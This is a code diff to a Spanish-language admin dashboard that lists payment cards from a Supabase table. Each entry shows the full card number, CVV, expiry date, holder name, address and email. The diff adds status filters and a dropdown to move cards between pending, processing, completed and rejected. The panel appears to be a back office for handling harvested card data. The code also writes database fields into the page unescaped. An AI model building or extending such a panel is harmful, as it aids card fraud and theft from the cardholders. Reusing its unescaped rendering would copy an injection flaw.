@@ -33,11 +33,42 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
         }
 
         h1 {
             font-size: 2rem;
             color: var(--primary);
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .filter-group {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 2px solid transparent;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.2s;
+            font-size: 0.9rem;
+        }
+
+        .filter-btn.active {
+            background: var(--primary);
+            border-color: var(--primary);
         }
 
         .refresh-btn {
@@ -104,6 +135,38 @@
             background: linear-gradient(135deg, #064e3b, #10b981);
         }
 
+        .state-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            z-index: 10;
+        }
+
+        .state-pending {
+            background: #fbbf24;
+            color: #1f2937;
+        }
+
+        .state-processing {
+            background: #3b82f6;
+            color: #fff;
+        }
+
+        .state-completed {
+            background: #10b981;
+            color: #fff;
+        }
+
+        .state-rejected {
+            background: #ef4444;
+            color: #fff;
+        }
+
         .card-chip {
             width: 50px;
             height: 40px;
@@ -166,6 +229,29 @@
             text-transform: none;
         }
 
+        .state-control {
+            margin-top: 10px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .state-select {
+            flex: 1;
+            padding: 8px;
+            border-radius: 8px;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .state-select option {
+            background: #1f2937;
+            color: #fff;
+        }
+
         .loading {
             text-align: center;
             font-size: 1.2rem;
@@ -182,7 +268,16 @@
 <body>
     <div class="header">
         <h1>Admin Dashboard</h1>
-        <button class="refresh-btn" onclick="fetchCards()">Refrescar Datos</button>
+        <div class="header-actions">
+            <div class="filter-group">
+                <button class="filter-btn active" data-filter="all">Todos</button>
+                <button class="filter-btn" data-filter="pending">Pendiente</button>
+                <button class="filter-btn" data-filter="processing">Procesando</button>
+                <button class="filter-btn" data-filter="completed">Completado</button>
+                <button class="filter-btn" data-filter="rejected">Rechazado</button>
+            </div>
+            <button class="refresh-btn" onclick="fetchCards()">Refrescar</button>
+        </div>
     </div>
 
     <div id="cardsGrid" class="cards-grid">
@@ -195,13 +290,44 @@
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
         const cardColors = ['card-blue', 'card-black', 'card-purple', 'card-orange', 'card-red', 'card-green'];
+        let allCardsData = [];
+        let currentFilter = 'all';
+
+        // Filter functionality
+        document.querySelectorAll('.filter-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentFilter = btn.dataset.filter;
+                renderCards();
+            });
+        });
+
+        async function updateCardState(cardId, newState) {
+            try {
+                const { error } = await supabaseClient
+                    .from('cards')
+                    .update({ state: newState })
+                    .eq('id', cardId);
+
+                if (error) throw error;
+
+                // Update local data
+                const card = allCardsData.find(c => c.id === cardId);
+                if (card) card.state = newState;
+
+                renderCards();
+            } catch (error) {
+                console.error('Error updating state:', error);
+                alert('Error al actualizar el estado');
+            }
+        }
 
         async function fetchCards() {
             const grid = document.getElementById('cardsGrid');
             grid.innerHTML = '<div class="loading">Cargando datos de Supabase...</div>';
 
             try {
-                // Fetch cards with related order info
                 const { data, error } = await supabaseClient
                     .from('cards')
                     .select(`
@@ -223,53 +349,74 @@
 
                 if (error) throw error;
 
-                grid.innerHTML = '';
-
-                if (data.length === 0) {
-                    grid.innerHTML = '<div class="loading">No hay tarjetas registradas aún.</div>';
-                    return;
-                }
-
-                data.forEach((item, index) => {
-                    const color = cardColors[index % cardColors.length];
-                    const order = item.orders || {};
-                    const fullName = `${order.first_name || 'ANÓNIMO'} ${order.last_name || ''}`;
-
-                    const cardHtml = `
-                        <div class="card-container">
-                            <div class="credit-card ${color}">
-                                <div class="card-chip"></div>
-                                <div class="card-number">${formatNumber(item.card_number)}</div>
-                                <div class="card-info">
-                                    <div class="info-group">
-                                        <div class="info-label">Card Holder</div>
-                                        <div class="card-holder">${fullName}</div>
-                                    </div>
-                                    <div class="info-group">
-                                        <div class="info-label">Expires</div>
-                                        <div class="card-expiry">${item.expiry_date}</div>
-                                    </div>
-                                    <div class="info-group">
-                                        <div class="info-label">CVV</div>
-                                        <div class="card-cvv">${item.cvv}</div>
-                                    </div>
-                                </div>
-                                <div class="card-logo">VISA</div>
-                            </div>
-                            <div class="user-details">
-                                <strong>📍 Ubicación:</strong> ${order.municipality || '?'}, ${order.department || '?'}<br>
-                                <strong>🏠 Dirección:</strong> ${order.address || '?'}<br>
-                                <strong>📧 Email:</strong> ${order.email || '?'}
-                            </div>
-                        </div>
-                    `;
-                    grid.innerHTML += cardHtml;
-                });
+                allCardsData = data;
+                renderCards();
 
             } catch (err) {
                 console.error(err);
                 grid.innerHTML = `<div class="loading error">Error: ${err.message}</div>`;
             }
+        }
+
+        function renderCards() {
+            const grid = document.getElementById('cardsGrid');
+
+            // Filter cards
+            const filteredData = currentFilter === 'all'
+                ? allCardsData
+                : allCardsData.filter(card => card.state === currentFilter);
+
+            if (filteredData.length === 0) {
+                grid.innerHTML = '<div class="loading">No hay tarjetas con este estado.</div>';
+                return;
+            }
+
+            grid.innerHTML = '';
+
+            filteredData.forEach((item, index) => {
+                const color = cardColors[index % cardColors.length];
+                const order = item.orders || {};
+                const fullName = `${order.first_name || 'ANÓNIMO'} ${order.last_name || ''}`;
+
+                const cardHtml = `
+                    <div class="card-container">
+                        <div class="credit-card ${color}">
+                            <span class="state-badge state-${item.state}">${item.state}</span>
+                            <div class="card-chip"></div>
+                            <div class="card-number">${formatNumber(item.card_number)}</div>
+                            <div class="card-info">
+                                <div class="info-group">
+                                    <div class="info-label">Card Holder</div>
+                                    <div class="card-holder">${fullName}</div>
+                                </div>
+                                <div class="info-group">
+                                    <div class="info-label">Expires</div>
+                                    <div class="card-expiry">${item.expiry_date}</div>
+                                </div>
+                                <div class="info-group">
+                                    <div class="info-label">CVV</div>
+                                    <div class="card-cvv">${item.cvv}</div>
+                                </div>
+                            </div>
+                            <div class="card-logo">VISA</div>
+                        </div>
+                        <div class="user-details">
+                            <strong>📍 Ubicación:</strong> ${order.municipality || '?'}, ${order.department || '?'}<br>
+                            <strong>🏠 Dirección:</strong> ${order.address || '?'}<br>
+                            <strong>📧 Email:</strong> ${order.email || '?'}
+                            <div class="state-control">
+                                <select class="state-select" onchange="updateCardState('${item.id}', this.value)">
+                                    <option value="pending" ${item.state === 'pending' ? 'selected' : ''}>Pendiente</option>
+                                    <option value="processing" ${item.state === 'processing' ? 'selected' : ''}>Procesando</option>
+                                    <option value="completed" ${item.state === 'completed' ? 'selected' : ''}>Completado</option>
+                                    <option value="rejected" ${item.state === 'rejected' ? 'selected' : ''}>Rechazado</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                grid.innerHTML += cardHtml;
+            });
         }
 
         function formatNumber(num) {
